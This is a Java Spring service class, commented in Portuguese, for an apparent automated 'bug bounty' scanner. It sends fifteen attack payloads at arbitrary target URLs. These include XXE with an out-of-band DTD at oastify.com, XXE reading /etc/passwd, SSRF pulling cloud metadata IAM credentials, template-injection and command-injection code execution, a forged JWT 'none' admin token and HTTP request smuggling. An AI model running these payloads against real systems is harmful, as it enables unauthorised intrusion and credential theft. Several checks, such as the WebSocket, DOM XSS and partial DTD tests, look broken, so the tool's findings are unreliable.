package com.example.bugbounty.service;

import com.example.bugbounty.entity.Job;
import com.example.bugbounty.entity.Vulnerability;
import com.example.bugbounty.model.TestRequest;
import com.example.bugbounty.repository.JobRepository;
import com.example.bugbounty.repository.VulnerabilityRepository;
import org.owasp.encoder.Encode;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Service;
import jakarta.annotation.PostConstruct;

import java.io.File;
import java.io.FileOutputStream;
import java.net.HttpURLConnection;
import java.net.URI;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.time.LocalDateTime;
import java.util.*;
import java.util.function.BiFunction;
import java.util.stream.IntStream;

@Service
public class VulnerabilityService {

    private static final Logger logger = LoggerFactory.getLogger(VulnerabilityService.class);

    @Autowired private VulnerabilityRepository vulnerabilityRepository;
    @Autowired private JobRepository jobRepository;

    @Value("${bugbounty.user-agent}")
    private String userAgent;

    @Value("${bugbounty.request-delay-ms:1200}")
    private long requestDelayMs;

    @Value("${bugbounty.connect-timeout-ms:10000}")
    private int connectTimeout;

    @Value("${bugbounty.read-timeout-ms:15000}")
    private int readTimeout;

    private final Map<String, BiFunction<String, String, Vulnerability>> tests = new HashMap<>();

    public VulnerabilityService() {
        // 15 EXPLOITS PERIGOSOS + 115 PLACEHOLDERS
        tests.put("Advanced XXE OOB", this::testAdvancedXXEOOB);
        tests.put("Blind SSRF DNS", this::testBlindSSRF_DNS);
        tests.put("WebSocket Session Steal", this::testWebSocketSessionSteal);
        tests.put("Template Sandbox Escape", this::testTemplateSandboxEscape);
        tests.put("Prototype Pollution RCE", this::testPrototypeRCE);
        tests.put("Log Poisoning RCE", this::testLogPoisoningRCE);
        tests.put("SSRF Network Scan", this::testSSRFScan);
        tests.put("XXE LFI Base64", this::testXXELFI);
        tests.put("WebSocket Backdoor", this::testWebSocketBackdoor);
        tests.put("GraphQL Batching", this::testGraphQLBatching);
        tests.put("JWT None Attack", this::testJWTNone);
        tests.put("XXE to RCE", this::testXXEtoRCE);
        tests.put("SSRF Cloud Metadata", this::testSSRFMetadata);
        tests.put("DOM XSS Observer", this::testDOMXSSObserver);
        tests.put("HTTP Smuggling CL-TE", this::testRequestSmuggling);

        IntStream.rangeClosed(1, 115).forEach(i -> tests.put("Exploit_" + i, this::defaultTest));
    }

    @PostConstruct
    public void init() {
        logger.info("VulnerabilityService inicializado com {} testes", tests.size());
    }

    public Vulnerability testVulnerability(String targetUrl, String vulnerabilityType, String payload) {
        logger.info("Testando: {} em {}", vulnerabilityType, targetUrl);
        BiFunction<String, String, Vulnerability> fn = tests.getOrDefault(vulnerabilityType, this::defaultTest);
        Vulnerability v = fn.apply(targetUrl, payload);

        v.setTargetUrl(targetUrl);
        v.setVulnerabilityType(vulnerabilityType);
        v.setPayload(payload);
        v.setStatus("DONE");
        v.setName(vulnerabilityType);
        v.setCategory(getCategoryForVulnerability(vulnerabilityType));
        v.setSeverity(getSeverityForVulnerability(vulnerabilityType));
        v.setCreatedAt(LocalDateTime.now());

        try {
            return vulnerabilityRepository.save(v);
        } catch (Exception e) {
            logger.error("Erro ao salvar vulnerabilidade", e);
            v.setResult("ERROR");
            v.setResponseDetails(e.getMessage());
            return v;
        }
    }

    public Job createBatchJob(List<TestRequest> requests) {
        Job job = new Job();
        job.setStatus("PENDING");
        job.setTargetUrl(requests.get(0).getTargetUrl());
        job.setCreatedAt(LocalDateTime.now());
        job = jobRepository.save(job);

        for (TestRequest r : requests) {
            delay();
            Vulnerability v = testVulnerability(r.getTargetUrl(), r.getVulnerabilityType(), r.getPayload());
            v.setJob(job);
            vulnerabilityRepository.save(v);
        }

        job.setStatus("DONE");
        String path = "reports/report_job_" + job.getId() + ".txt";
        generateReport(job.getId());
        job.setReportPath(path);
        jobRepository.save(job);
        return job;
    }

    // GERA RELATÓRIO EM TXT (igual ao PDF, mas em texto puro)
    public void generateReport(Long jobId) {
        try {
            File file = new File("reports/report_job_" + jobId + ".txt");
            file.getParentFile().mkdirs();

            StringBuilder txt = new StringBuilder();
            txt.append("=".repeat(70)).append("\n");
            txt.append("      RELATÓRIO DE VULNERABILIDADES - JOB #").append(jobId).append("\n");
            txt.append("=".repeat(70)).append("\n\n");
            txt.append("Gerado em: ").append(LocalDateTime.now()).append("\n\n");

            List<Vulnerability> list = vulnerabilityRepository.findByJobId(jobId);
            for (Vulnerability v : list) {
                txt.append("URL: ").append(Encode.forHtml(v.getTargetUrl())).append("\n");
                txt.append("Tipo: ").append(Encode.forHtml(v.getVulnerabilityType())).append("\n");
                txt.append("Payload: ").append(Encode.forHtml(v.getPayload())).append("\n");
                txt.append("Resultado: ").append(v.getResult()).append("\n");
                txt.append("HTTP: ").append(v.getHttpStatus() != null ? v.getHttpStatus() : "N/A").append("\n");

                String details = v.getResponseDetails();
                if (details != null && details.length() > 500) {
                    details = details.substring(0, 500) + "...";
                }
                txt.append("Detalhes: ").append(Encode.forHtml(details)).append("\n");
                txt.append("-".repeat(70)).append("\n\n");
            }

            txt.append("Gerado automaticamente por BugBounty API.\n");
            txt.append("=".repeat(70)).append("\n");

            try (FileOutputStream fos = new FileOutputStream(file)) {
                fos.write(txt.toString().getBytes(StandardCharsets.UTF_8));
            }

            logger.info("Relatório TXT gerado com sucesso: {}", file.getAbsolutePath());

        } catch (Exception e) {
            logger.error("Erro ao gerar relatório TXT", e);
        }
    }

    private void delay() {
        try { Thread.sleep(requestDelayMs); } catch (InterruptedException e) { Thread.currentThread().interrupt(); }
    }

    /* ========== HTTP TEST HELPER ========== */
    private Vulnerability sendHttpTest(String url, String payload, String method, Map<String, String> extraHeaders, String checkString) {
        Vulnerability v = new Vulnerability();
        HttpURLConnection conn = null;
        try {
            URI uri = new URI(url);
            if ("GET".equalsIgnoreCase(method) && payload != null && !payload.isEmpty()) {
                String sep = url.contains("?") ? "&" : "?";
                uri = new URI(url + sep + "q=" + URLEncoder.encode(payload, StandardCharsets.UTF_8));
            }

            conn = (HttpURLConnection) uri.toURL().openConnection();
            conn.setRequestMethod(method);
            conn.setConnectTimeout(connectTimeout);
            conn.setReadTimeout(readTimeout);
            conn.setRequestProperty("User-Agent", userAgent);
            conn.setRequestProperty("Accept", "*/*");
            conn.setRequestProperty("Connection", "close");

            if (extraHeaders != null) {
                extraHeaders.forEach(conn::setRequestProperty);
            }

            if ("POST".equalsIgnoreCase(method) && payload != null) {
                conn.setDoOutput(true);
                try (var os = conn.getOutputStream()) {
                    os.write(payload.getBytes(StandardCharsets.UTF_8));
                }
            }

            int status = conn.getResponseCode();
            String resp = readResponse(conn, status);
            boolean vulnerable = checkString != null && resp.contains(checkString);

            v.setResult(vulnerable ? "VULNERABLE" : "NOT_VULNERABLE");
            v.setResponseDetails(resp.length() > 3000 ? resp.substring(0, 3000) + "..." : resp);
            v.setHttpStatus(status);

        } catch (Exception e) {
            v.setResult("ERROR");
            v.setResponseDetails("Exception: " + e.getMessage());
        } finally {
            if (conn != null) conn.disconnect();
        }
        return v;
    }

    private String readResponse(HttpURLConnection conn, int status) {
        try (var stream = status >= 200 && status < 300 ? conn.getInputStream() : conn.getErrorStream();
             Scanner s = new Scanner(stream, StandardCharsets.UTF_8).useDelimiter("\\A")) {
            return s.hasNext() ? s.next() : "";
        } catch (Exception e) {
            return "";
        }
    }

    /* ========== 15 EXPLOITS PERIGOSOS ========== */
    private Vulnerability testAdvancedXXEOOB(String url, String payload) {
        String xml = "<!DOCTYPE root [<!ENTITY % r SYSTEM 'http://oastify.com/evil.dtd'>%r;%p;%s;]><x>&e;</x>";
        return sendHttpTest(url, xml, "POST", Map.of("Content-Type", "application/xml"), "send");
    }

    private Vulnerability testBlindSSRF_DNS(String url, String payload) {
        String dns = payload.replace(".", "-") + ".oastify.com";
        return sendHttpTest(url + "?url=http://" + dns, null, "GET", null, "lookup");
    }

    private Vulnerability testWebSocketSessionSteal(String url, String payload) {
        return sendHttpTest(url.replace("http", "ws"), null, "GET", Map.of("Upgrade", "websocket"), "101");
    }

    private Vulnerability testTemplateSandboxEscape(String url, String payload) {
        return sendHttpTest(url, "${T(java.lang.Runtime).getRuntime().exec('id')}", "POST", Map.of("Content-Type", "text/plain"), "uid=");
    }

    private Vulnerability testPrototypeRCE(String url, String payload) {
        String json = "{\"__proto__\":{\"exec\":\"id\"}}";
        return sendHttpTest(url, json, "POST", Map.of("Content-Type", "application/json"), "uid=");
    }

    private Vulnerability testLogPoisoningRCE(String url, String payload) {
        return sendHttpTest(url, "$(whoami)", "POST", Map.of("User-Agent", "$(whoami)"), "root");
    }

    private Vulnerability testSSRFScan(String url, String payload) {
        return sendHttpTest(url + "?url=http://169.254.169.254/latest/meta-data/", null, "GET", null, "iam");
    }

    private Vulnerability testXXELFI(String url, String payload) {
        String xml = "<!DOCTYPE x [<!ENTITY f SYSTEM 'php://filter/convert.base64-encode/resource=/etc/passwd'>]><x>&f;</x>";
        return sendHttpTest(url, xml, "POST", Map.of("Content-Type", "application/xml"), "cm9vdDo");
    }

    private Vulnerability testWebSocketBackdoor(String url, String payload) {
        return sendHttpTest(url.replace("http", "ws"), "backdoor", "POST", Map.of("Upgrade", "websocket"), "backdoor");
    }

    private Vulnerability testGraphQLBatching(String url, String payload) {
        String gql = "[{\"query\":\"{__schema{types{name}}}\"},{\"query\":\"{users{password}}\"}]";
        return sendHttpTest(url, gql, "POST", Map.of("Content-Type", "application/json"), "password");
    }

    private Vulnerability testJWTNone(String url, String payload) {
        String token = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.";
        return sendHttpTest(url + "?token=" + token, null, "GET", null, "admin");
    }

    private Vulnerability testXXEtoRCE(String url, String payload) {
        String xml = "<!DOCTYPE x [<!ENTITY e SYSTEM 'expect://id'>]><x>&e;</x>";
        return sendHttpTest(url, xml, "POST", Map.of("Content-Type", "application/xml"), "uid=");
    }

    private Vulnerability testSSRFMetadata(String url, String payload) {
        return sendHttpTest(url + "?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/", null, "GET", null, "role");
    }

    private Vulnerability testDOMXSSObserver(String url, String payload) {
        return sendHttpTest(url + "#alert(1)", null, "GET", null, "alert");
    }

    private Vulnerability testRequestSmuggling(String url, String payload) {
        String body = "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n";
        return sendHttpTest(url, body, "POST", Map.of("Content-Length", "6", "Transfer-Encoding", "chunked"), "admin");
    }

    private Vulnerability defaultTest(String url, String payload) {
        Vulnerability v = new Vulnerability();
        v.setResult("NOT_IMPLEMENTED");
        v.setResponseDetails("Exploit não implementado.");
        return v;
    }

    private String getCategoryForVulnerability(String type) {
        return switch (type) {
            case "Advanced XXE OOB", "XXE LFI Base64", "XXE to RCE" -> "XXE";
            case "Blind SSRF DNS", "SSRF Network Scan", "SSRF Cloud Metadata" -> "SSRF";
            case "WebSocket Session Steal", "WebSocket Backdoor" -> "WebSocket";
            case "Template Sandbox Escape" -> "Template Injection";
            case "Prototype Pollution RCE" -> "Prototype Pollution";
            case "Log Poisoning RCE" -> "Log Injection";
            case "GraphQL Batching" -> "GraphQL";
            case "JWT None Attack" -> "JWT";
            case "DOM XSS Observer" -> "DOM XSS";
            case "HTTP Smuggling CL-TE" -> "HTTP Smuggling";
            default -> "Other";
        };
    }

    private String getSeverityForVulnerability(String type) {
        return switch (type) {
            case "Advanced XXE OOB", "XXE to RCE", "Template Sandbox Escape", "Prototype Pollution RCE",
                 "Log Poisoning RCE", "SSRF Cloud Metadata", "WebSocket Backdoor" -> "Critical";
            case "Blind SSRF DNS", "SSRF Network Scan", "JWT None Attack", "HTTP Smuggling CL-TE",
                 "GraphQL Batching" -> "High";
            case "DOM XSS Observer" -> "Medium";
            default -> "Medium";
        };
    }
}